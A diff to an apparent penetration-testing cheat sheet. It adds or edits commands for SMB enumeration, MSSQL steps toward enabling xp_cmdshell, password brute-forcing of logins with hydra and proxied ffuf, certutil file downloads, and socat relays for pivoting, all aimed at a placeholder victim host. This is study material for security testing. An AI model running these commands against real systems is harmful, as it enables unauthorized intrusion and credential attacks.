@@ -453,6 +453,7 @@ Definitely look at [HackTricks](https://book.hacktricks.xyz/pentesting/pentestin
 ```sh
 # list available shares
 smbmap -H $VICTIM_IP
+# try with '-u guest' if getting "[!] Authentication error"
 
 # list (only) windows version
 smbmap -vH $VICTIM_IP
@@ -468,6 +469,9 @@ enum4linux $VICTIM_IP
 
 # scan all the things
 enum4linux -aMld $VICTIM_IP | tee enum4linux.log
+# try with guest user if getting nothing via null session:
+enum4linux -u guest -aMld $VICTIM_IP | tee enum4linux.log
+# may need workgroup: '-w' (smbmap can get it when enum4linux doesn't)
 
 # nmap script scans
 nmap --script="safe and smb-*" -n -v -p 445 $VICTIM_IP
@@ -524,7 +528,8 @@ impacket-mssqlclient DOMAIN/USERNAME@$VICTIM_IP -windows-auth
 
 ```sql
 -- Check if you have server admin rights to enable command execution:
-SELECT IS_SRVROLEMEMBER('sysadmin')
+SELECT IS_SRVROLEMEMBER('sysadmin');
+go
 
 -- turn on advanced options; needed to configure xp_cmdshell
 sp_configure 'show advanced options', '1';
@@ -877,6 +882,9 @@ medusa -u root -P 500-worst-passwords.txt -h $VICTIM_IP -M ssh
 # '-t 64': use 64 threads
 # change to https-web-form for port 443
 hydra -l admin -P ~/repos/SecLists/Passwords/Leaked-Databases/rockyou-50.txt $VICTIM_IP_OR_DOMAIN http-post-form "/blog/admin.php:username=^USER^&password=^PASS^:Incorrect username" -t 64
+
+# proxy-aware password bruteforcing with ffuf
+ffuf -x socks5://localhost:1080 -u http://$VICTIM_IP/login -X POST -w /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt -d "UsernameOrODEmail=admin&Password=FUZZ&RememberMe=true" -fw 6719
 ```
 
 ### 4.2.7. Zip File Password Cracking
@@ -1293,7 +1301,7 @@ certutil -decode encodedInputFileName decodedOutputFileName
 :: hex decode a file
 certutil --decodehex encoded_hexadecimal_InputFileName
 :: MD5 checksum
-certutil.exe -hashfile somefile.txt MD5
+certutil -hashfile somefile.txt MD5
 ```
 
 ### 5.4.5. Execute Inline Tasks with MSBuild.exe
@@ -2177,8 +2185,8 @@ sshfs -F/full/path/to/ssh-config alpha:/ ./rootfs
 
 ```bat
 :: Download 7zip binary to ./7zip.exe, using urlcache or verifyctl
-certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
-certutil.exe -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe
+certutil -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
+certutil -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe
 
 :: Download using expand
 expand http://7-zip.org/a/7z1604-x64.exe 7zip.exe
@@ -2615,6 +2623,9 @@ On the jump-box:
 sudo socat TCP4-LISTEN:80,fork TCP4:REMOTE_HOST_IP:80
 # optionally, do same thing bound to specific interface IP
 socat TCP4-LISTEN:80,bind=10.0.0.2,fork TCP4:REMOTE_HOST_IP:80
+
+# UDP relay
+socat -u UDP-RECVFROM:1978,fork,reuseaddr UDP-SENDTO:10.1.1.89:1978
 ```
 
 ## 10.4. Bending with rinetd
